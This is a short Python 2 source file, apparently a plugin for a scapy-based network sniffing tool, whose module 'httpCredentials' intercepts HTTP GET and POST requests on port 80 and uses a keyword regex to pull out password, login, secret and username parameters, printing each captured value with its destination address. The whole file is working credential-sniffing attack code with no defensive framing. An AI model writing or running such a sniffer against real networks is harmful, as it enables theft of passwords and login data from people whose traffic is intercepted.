#!/usr/bin/python
# -*- coding: utf-8 -*-

from scapy.all import *
import re

class module:

    def processPacket(self, packet):
        if packet.payload.dport == 80:
            data = packet.payload.payload.payload.fields["load"]
            if data.startswith('GET') or data.startswith("POST"):
                if any(word.lower() in data.lower() for word in self.keywords):
                    responses = self.regex.findall(data)
                    for response in responses:
                        print "[+] HTTP %s sent to %s : %s" % (response[0], packet.payload.dst, response[1])

    def getDescription(self):
        return "%s (%s)" % (self.moduleName, self.moduleDescription) 

    def __init__(self):
        self.moduleName = "httpCredentials"
        self.moduleDescription = "Sniff HTTP credentials"
        self.keywords = ['pass', 'secret', 'login', 'identifier', 'username']
        self.regex = re.compile(r'[?&]((?:' + '|'.join(self.keywords) + ')[^=]*)=([^&\s]*)', re.IGNORECASE)
